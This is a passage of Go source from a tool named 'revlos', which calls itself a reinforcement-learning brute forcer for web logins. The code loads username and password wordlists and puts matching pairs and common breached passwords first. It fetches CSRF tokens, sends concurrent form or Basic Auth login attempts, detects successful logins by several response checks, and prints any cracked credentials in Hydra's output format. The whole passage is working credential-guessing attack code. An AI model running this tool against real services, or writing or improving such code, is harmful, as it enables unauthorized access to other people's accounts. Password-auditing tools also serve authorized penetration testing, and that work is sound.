			fmt.Printf("❌ Invalid form format. Expected: \"path:params:condition\"\n")
			fmt.Printf("Got: %s\n", formSpec)
			os.Exit(1)
		}

		path = strings.TrimSpace(parts[0])
		params = strings.TrimSpace(parts[1])
		condition := strings.TrimSpace(parts[2])

		// Extract failure string
		if strings.HasPrefix(condition, "F=") {
			failureString = condition[2:]
		}

		// Extract field names from params
		userField = "username"
		passField = "password"
		if strings.Contains(params, "^USER^") {
			paramParts := strings.Split(params, "&")
			for _, part := range paramParts {
				if strings.Contains(part, "^USER^") {
					userField = strings.Split(part, "=")[0]
				}
				if strings.Contains(part, "^PASS^") {
					passField = strings.Split(part, "=")[0]
				}
			}
		}
	}

	// Build target URL (avoid double path if baseURL already contains it)
	target := baseURL
	if !strings.Contains(baseURL, path) && path != "" {
		target = fmt.Sprintf("%s%s", baseURL, path)
	}

	// Parse custom headers
	customHeaders := make(map[string]string)
	if *headers != "" {
		for _, header := range strings.Split(*headers, ",") {
			parts := strings.SplitN(header, ":", 2)
			if len(parts) == 2 {
				customHeaders[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
			}
		}
	}

	// Normalize method
	httpMethod := strings.ToUpper(*method)
	if httpMethod != "GET" && httpMethod != "POST" {
		httpMethod = "POST" // Default fallback
	}

	if !*quiet {
		fmt.Println("溺 revlos - Ultimate RL Multi-Algorithm Brute Forcer")
		fmt.Println("====================================================")
		fmt.Printf("Target:    %s\n", target)
		fmt.Printf("Method:    %s\n", httpMethod)
		fmt.Printf("Params:    %s\n", params)
		fmt.Printf("Failure:   %s\n", failureString)
		fmt.Printf("Workers:   %d\n", *workers)
		fmt.Printf("Stop:      %v\n", *stopOnFirst)
		if len(customHeaders) > 0 {
			fmt.Printf("Headers:   %d custom headers\n", len(customHeaders))
		}
		fmt.Println("Algorithms: UCB1 + Genetic + Thompson Sampling")
		fmt.Println()
	}

	// Load wordlists or single credentials
	var usernames, passwords []string
	var err error

	// Check for username input (-l or -L)
	if *username != "" && *usernameList != "" {
		fmt.Println("❌ Error: Cannot use both -l (single username) and -L (username list)")
		os.Exit(1)
	}
	if *username == "" && *usernameList == "" {
		fmt.Println("❌ Error: Either -l (username) or -L (username list) is required")
		os.Exit(1)
	}

	// Check for password input (-p or -P)
	if *password != "" && *passwordList != "" {
		fmt.Println("❌ Error: Cannot use both -p (single password) and -P (password list)")
		os.Exit(1)
	}
	if *password == "" && *passwordList == "" {
		fmt.Println("❌ Error: Either -p (password) or -P (password list) is required")
		os.Exit(1)
	}

	if !*quiet {
		fmt.Println(" Loading credentials...")
	}

	// Load usernames
	if *username != "" {
		usernames = []string{*username}
	} else {
		usernames, err = loadWordlist(*usernameList)
		if err != nil {
			fmt.Printf("❌ Error loading username list: %v\n", err)
			os.Exit(1)
		}
	}

	// Load passwords
	if *password != "" {
		passwords = []string{*password}
	} else {
		passwords, err = loadWordlist(*passwordList)
		if err != nil {
			fmt.Printf("❌ Error loading password list: %v\n", err)
			os.Exit(1)
		}
	}

	if !*quiet {
		fmt.Printf("✓ Loaded %d usernames\n", len(usernames))
		fmt.Printf("✓ Loaded %d passwords\n\n", len(passwords))
	}

	var allCreds []Credential
	// Strategy 1: Prioritize username==password combinations
	matchingCreds := []Credential{}
	// Strategy 2: Prioritize common passwords with all usernames
	commonPasswordCreds := []Credential{}
	otherCreds := []Credential{}

	// Common passwords from real-world breaches (top 15)
	commonPasswords := []string{
		"password", "admin", "123456", "password123", "admin123",
		"root", "test", "demo", "12345678", "123456789",
		"Password1", "Admin123", "Test123", "qwerty", "letmein",
	}

	// Map for quick lookup
	commonPassMap := make(map[string]bool)
	for _, cp := range commonPasswords {
		commonPassMap[cp] = true
	}

	for _, user := range usernames {
		for _, pass := range passwords {
			cred := Credential{Username: user, Password: pass}
			if user == pass {
				// Priority 1: Matching credentials
				matchingCreds = append(matchingCreds, cred)
			} else if commonPassMap[pass] {
				// Priority 2: Common passwords
				commonPasswordCreds = append(commonPasswordCreds, cred)
			} else {
				// Priority 3: Everything else
				otherCreds = append(otherCreds, cred)
			}
		}
	}

	// Put high-priority credentials first
	allCreds = append(matchingCreds, commonPasswordCreds...)
	allCreds = append(allCreds, otherCreds...)
	totalCreds := len(allCreds)

	if !*quiet {
		priorityCount := len(matchingCreds) + len(commonPasswordCreds)
		if priorityCount > 0 {
			fmt.Printf(" Total combinations: %d (%d high-priority patterns prioritized)\n", totalCreds, priorityCount)
			if len(matchingCreds) > 0 {
				fmt.Printf("   ├─ %d matching username/password pairs\n", len(matchingCreds))
			}
			if len(commonPasswordCreds) > 0 {
				fmt.Printf("   └─ %d common password combinations\n", len(commonPasswordCreds))
			}
		} else {
			fmt.Printf(" Total combinations: %d\n", totalCreds)
		}
		fmt.Println(" Starting multi-algorithm adaptive attack...\n")
	}

	rl := NewUltimateRL()
	numWorkers := *workers
	batchSize := 150 // Medium batches for optimal learning

	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
		Transport: &http.Transport{
			MaxIdleConns:        numWorkers * 2,
			MaxIdleConnsPerHost: numWorkers * 2,
			IdleConnTimeout:     90 * time.Second,
			DisableCompression:  true,
		},
		Timeout: time.Duration(*timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Parse success codes if provided
	var successCodes map[int]bool
	if *successCode != "" {
		successCodes = make(map[int]bool)
		for _, code := range strings.Split(*successCode, ",") {
			var c int
			fmt.Sscanf(strings.TrimSpace(code), "%d", &c)
			if c > 0 {
				successCodes[c] = true
			}
		}
	}

	var (
		attempts   int64
		startTime  = time.Now()
		found      = make(chan Credential, 1)
		mu         sync.Mutex
		processing = 0
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	credChan := make(chan Credential, numWorkers*2)
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case cred, ok := <-credChan:
					if !ok {
						return
					}

					if *verbose {
						fmt.Printf("[ATTEMPT] %s:%s\n", cred.Username, cred.Password)
					}

					var success bool
					var respTime time.Duration

					// Use headless browser mode if enabled
					if *headless {
						successIndicators := make(map[string]string)
						if *successText != "" {
							successIndicators["text"] = *successText
						}
						if failureString != "" {
							successIndicators["failure"] = failureString
						}
						successIndicators["url"] = "logged-in-successfully"

						success, respTime = attemptLoginHeadless(ctx, target, userField, passField, cred.Username, cred.Password, successIndicators)
						rl.learn(cred.Username, cred.Password, respTime, success)

						// Show progress in headless mode
						currentAttempts := atomic.LoadInt64(&attempts) + 1
						if !*quiet {
							percentage := float64(currentAttempts) / float64(totalCreds) * 100
							fmt.Printf("\r[%d/%d] (%.1f%%) Testing %s:%s - %s    ",
								currentAttempts, totalCreds, percentage,
								cred.Username, cred.Password,
								map[bool]string{true: "✓ SUCCESS", false: "✗ Failed"}[success])
							if success {
								fmt.Println() // New line on success
							}
						}

						if success {
							select {
							case found <- cred:
								cancel()
							default:
							}
							atomic.AddInt64(&attempts, 1)
							mu.Lock()
							processing--
							mu.Unlock()
							return
						}

						atomic.AddInt64(&attempts, 1)
						mu.Lock()
						processing--
						mu.Unlock()
						continue
					}

					// HTTP mode (original code)
					attemptStart := time.Now()

					var req *http.Request

					// Check if using Basic Auth
					if useBasicAuth {
						// Basic Auth: Simple GET request with Authorization header
						req, _ = http.NewRequestWithContext(ctx, "GET", target, nil)
						req.SetBasicAuth(cred.Username, cred.Password)
					} else {
						// Form-based auth
						data := url.Values{}
						data.Set(userField, cred.Username)
						data.Set(passField, cred.Password)

						// Extract CSRF token if present
						getResp, err := client.Get(target)
						if err == nil {
							getBody, _ := io.ReadAll(getResp.Body)
							getResp.Body.Close()

							// Try common CSRF field names
							for _, csrfField := range []string{"CSRFToken", "csrf_token", "_csrf", "authenticity_token", "_token"} {
								if token := extractCSRF(string(getBody), csrfField); token != "" {
									data.Set(csrfField, token)
									break
								}
							}
						}

						if httpMethod == "GET" {
							// GET: Add parameters to URL
							targetWithParams := target
							if strings.Contains(target, "?") {
								targetWithParams += "&" + data.Encode()
							} else {
								targetWithParams += "?" + data.Encode()
							}
							req, _ = http.NewRequestWithContext(ctx, "GET", targetWithParams, nil)
						} else {
							// POST: Send as form data
							req, _ = http.NewRequestWithContext(ctx, "POST", target, strings.NewReader(data.Encode()))
							req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
						}
					}

					// Add custom headers
					for key, value := range customHeaders {
						req.Header.Set(key, value)
					}

					resp, err := client.Do(req)
					respTime = time.Since(attemptStart)

					if err == nil {
						body, _ := io.ReadAll(resp.Body)
						resp.Body.Close()
						bodyStr := string(body)

						if *verbose && len(bodyStr) == 0 {
							fmt.Printf("[DEBUG] Empty body! Status: %d, Content-Length: %s, Content-Encoding: %s\n",
								resp.StatusCode, resp.Header.Get("Content-Length"), resp.Header.Get("Content-Encoding"))
						}

						// Enhanced success detection with multiple strategies
						success = false

						// Basic Auth: 200 = success, 401 = failure
						if useBasicAuth {
							success = (resp.StatusCode == 200)
						} else {
							// Form-based authentication detection

						// 1. Check custom success codes if specified
						if len(successCodes) > 0 {
							success = successCodes[resp.StatusCode]
						}

						// 2. Check for any redirect if --any-redirect flag is set
						if !success && *anyRedirect && resp.StatusCode >= 300 && resp.StatusCode < 400 {
							success = true
						}

						// 3. Check for redirect containing "success" (default behavior)
						if !success && resp.StatusCode >= 300 && resp.StatusCode < 400 {
							location := resp.Header.Get("Location")
							if location != "" {
								// If --any-redirect not set, check for "success" in redirect
								if *anyRedirect {
									success = true
								} else if strings.Contains(location, "success") {
									success = true
								}
							}
						}

						// 4. Check for success text in body
						if !success && *successText != "" && strings.Contains(bodyStr, *successText) {
							success = true
						}

						// 5. Check for success cookie
						if !success && *successCookie != "" {
							for _, cookie := range resp.Cookies() {
								if cookie.Name == *successCookie {
									success = true
									break
								}
							}
						}

						// 6. Check failure string (if present and no other success indicators)
						if !success && failureString != "" {
							// If failure string NOT found in response, it's a success
							hasFailure := strings.Contains(bodyStr, failureString)
							success = !hasFailure
							if *verbose && success {
								fmt.Printf("[DEBUG] No failure string found for %s:%s\n", cred.Username, cred.Password)
							}
						}

						// 7. IMPROVED: Verify success by checking if still on login page
						if success {
							if *verbose {
								fmt.Printf("[DEBUG] Checking if still on login page for %s:%s (body length: %d)\n", cred.Username, cred.Password, len(bodyStr))
								if len(bodyStr) > 200 {
									fmt.Printf("[DEBUG] Body preview: %s...\n", bodyStr[:200])
								}
							}
							// Check for login form indicators that suggest we're still on the login page
							loginIndicators := []string{
								fmt.Sprintf(`name="%s"`, userField),
								fmt.Sprintf(`name="%s"`, passField),
								`type="password"`,
								`<title>Login</title>`,
								`<title>Sign In</title>`,
								`<title>Sign in</title>`,
								`<title>Authentication</title>`,
								`class="login`,
								`id="login`,
								`id="form_login`,
							}

							stillOnLoginPage := false

							// First check: If it's a redirect back to the login page, it's a failure
							if resp.StatusCode >= 300 && resp.StatusCode < 400 {
								location := resp.Header.Get("Location")
								if location != "" {
									loginPaths := []string{"/login", "/auth", "/signin", "/sign-in", "authentication"}
									for _, path := range loginPaths {
										if strings.Contains(strings.ToLower(location), path) {
											stillOnLoginPage = true
											if *verbose {
												fmt.Printf("[DEBUG] Redirect back to login page: %s\n", location)
											}
											break
										}
									}
								}
							}

							// Second check: If body has login form indicators (only if not already detected)
							if !stillOnLoginPage {
								for i, indicator := range loginIndicators {
									if *verbose && i < 3 {
										fmt.Printf("[DEBUG] Checking indicator %d: %s\n", i, indicator[:min(len(indicator), 40)])
									}
									if strings.Contains(bodyStr, indicator) {
										stillOnLoginPage = true
										if *verbose {
											fmt.Printf("[DEBUG] Still on login page (found: %s)\n", indicator[:min(len(indicator), 30)])
										}
										break
									}
								}
							}

							// If we're still on the login page, it's a false positive
							if stillOnLoginPage {
								success = false
								if *verbose {
									fmt.Printf("[DEBUG] Marking as false positive for %s:%s\n", cred.Username, cred.Password)
								}
							}
						}

						// 8. Default: 200 OK is success (if no other rules matched)
						if !success && len(successCodes) == 0 && !*anyRedirect && *successText == "" && *successCookie == "" && failureString == "" {
							success = resp.StatusCode == 200
						}
						} // End of form-based detection

						rl.learn(cred.Username, cred.Password, respTime, success)

						if success {
							select {
							case found <- cred:
								cancel()
							default:
							}
							return
						}
					}

					atomic.AddInt64(&attempts, 1)
					mu.Lock()
					processing--
					mu.Unlock()
				}
			}
		}()
	}

	go func() {
		remaining := allCreds
		generation := 0

		for len(remaining) > 0 && ctx.Err() == nil {
			generation++

			remaining = rl.prioritize(remaining)

			currentBatch := batchSize
			// Aggressive exploitation after learning
			if generation > 3 && rl.exploitMode {
				currentBatch = batchSize / 3 // Very small batches when exploiting
			} else if generation > 3 {
				currentBatch = batchSize / 2
			}

			if currentBatch > len(remaining) {
				currentBatch = len(remaining)
			}

			batch := remaining[:currentBatch]
			remaining = remaining[currentBatch:]

			for _, cred := range batch {
				mu.Lock()
				processing++
				mu.Unlock()

				select {
				case <-ctx.Done():
					close(credChan)
					return
				case credChan <- cred:
				}
			}

			for {
				mu.Lock()
				p := processing
				mu.Unlock()
				if p < numWorkers/2 || ctx.Err() != nil {
					break
				}
				time.Sleep(10 * time.Millisecond)
			}

			if !*quiet {
				mode := "EXPLORE"
				if rl.exploitMode {
					mode = "EXPLOIT"
				}

				fmt.Printf("溺 Gen %d [%s] | Attempts: %d/%d | Patterns: %d | UCB1 Arms: %d | Time: %.2fs\n",
					generation, mode, atomic.LoadInt64(&attempts), totalCreds,
					len(rl.patterns), len(rl.armScores), time.Since(startTime).Seconds())
			}
		}
		close(credChan)
	}()

	select {
	case cred := <-found:
		wg.Wait()
		elapsed := time.Since(startTime)

		// Hydra-like output format
		fmt.Printf("\n[%d][http-post-form] host: %s   login: %s   password: %s\n",
			*port, targetHost, cred.Username, cred.Password)
		fmt.Printf("1 of 1 target successfully completed, 1 valid password found\n")

		if !*quiet {
			fmt.Println()
			fmt.Println(" Performance Statistics")
			fmt.Println("==================================================")
			fmt.Printf("Total attempts: %d/%d (%.1f%% of search space)\n",
				atomic.LoadInt64(&attempts), totalCreds,
				float64(atomic.LoadInt64(&attempts))/float64(totalCreds)*100)
			fmt.Printf("Time elapsed: %.2fs\n", elapsed.Seconds())
			fmt.Printf("Average rate: %.0f req/s\n", float64(atomic.LoadInt64(&attempts))/elapsed.Seconds())
			fmt.Printf("Genetic patterns evolved: %d\n", len(rl.patterns))
			fmt.Printf("UCB1 arms explored: %d\n", len(rl.armScores))
			fmt.Printf("Thompson distributions: %d\n", len(rl.alphaBeta))
			fmt.Printf("Search space reduction: %.1fx (only %.1f%% needed)\n",
				float64(totalCreds)/float64(atomic.LoadInt64(&attempts)),
				float64(atomic.LoadInt64(&attempts))/float64(totalCreds)*100)
		}

	case <-time.After(func() time.Duration {
		if *maxTime > 0 {
			return time.Duration(*maxTime) * time.Second
		}
		return 24 * time.Hour // Effectively no limit
	}()):
		cancel()
		wg.Wait()
		fmt.Println("\n0 of 1 target completed, 0 valid password found")
		if *maxTime > 0 {
			fmt.Printf("Timeout reached after %d seconds\n", *maxTime)
		} else {
			fmt.Println("Timeout reached after 24 hours")
		}
	}
}
